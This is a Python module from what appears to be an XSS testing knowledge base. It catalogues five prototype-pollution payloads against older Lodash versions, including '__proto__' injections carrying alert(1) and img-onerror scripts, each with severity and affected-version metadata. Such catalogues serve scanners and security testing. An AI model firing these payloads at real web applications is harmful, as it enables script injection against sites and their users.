#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Lodash Prototype Pollution Gadgets
"""

from ..models import PayloadEntry

LODASH_GADGETS_PAYLOADS = {
    "lodash_template_gadget": PayloadEntry(
        payload='{"__proto__":{"sourceURL":"\u2028\u2029alert(1)"}}',
        contexts=["javascript", "json", "prototype_pollution"],
        severity="critical",
        cvss_score=9.8,
        description="Lodash template() gadget via sourceURL injection",
        tags=["lodash", "prototype-pollution", "gadget", "rce"],
        browser_support=["all"],
        reliability="high",
        known_affected=["lodash < 4.17.16"]
    ),
    "lodash_defaults_deep": PayloadEntry(
        payload='{"constructor": {"prototype": {"toString": "alert(1)"}}}',
        contexts=["javascript", "json", "prototype_pollution"],
        severity="high",
        cvss_score=8.1,
        description="Lodash defaultsDeep prototype pollution via toString",
        tags=["lodash", "prototype-pollution", "gadget"],
        browser_support=["all"],
        reliability="medium",
        known_affected=["lodash < 4.17.12"]
    ),
    "lodash_merge_pollute": PayloadEntry(
        payload='{"__proto__":{"polluted":true,"xss":"<img src=x onerror=alert(1)>"}}',
        contexts=["javascript", "json", "prototype_pollution"],
        severity="high",
        cvss_score=7.5,
        description="Standard Lodash merge pollution for property injection",
        tags=["lodash", "prototype-pollution", "merge"],
        browser_support=["all"],
        reliability="high",
        known_affected=["lodash < 4.17.11"]
    ),
    "lodash_set_pollute": PayloadEntry(
        payload='{"path":"__proto__.xss","value":"<script>alert(1)</script>"}',
        contexts=["javascript", "json", "prototype_pollution"],
        severity="critical",
        cvss_score=8.8,
        description="Lodash set() pollution vector",
        tags=["lodash", "prototype-pollution", "set"],
        browser_support=["all"],
        reliability="high",
        known_affected=["lodash < 4.17.16"]
    ),
     "lodash_zipobject_deep": PayloadEntry(
        payload='{"__proto__":{"param":"<img src=x onerror=alert(1)>"}}',
        contexts=["javascript", "json", "prototype_pollution"],
        severity="high",
        cvss_score=7.5,
        description="Lodash zipObjectDeep pollution",
        tags=["lodash", "prototype-pollution", "zipObjectDeep"],
        browser_support=["all"],
        reliability="medium",
        known_affected=["lodash < 4.17.20"]
    )
}

LODASH_GADGETS_TOTAL = len(LODASH_GADGETS_PAYLOADS)
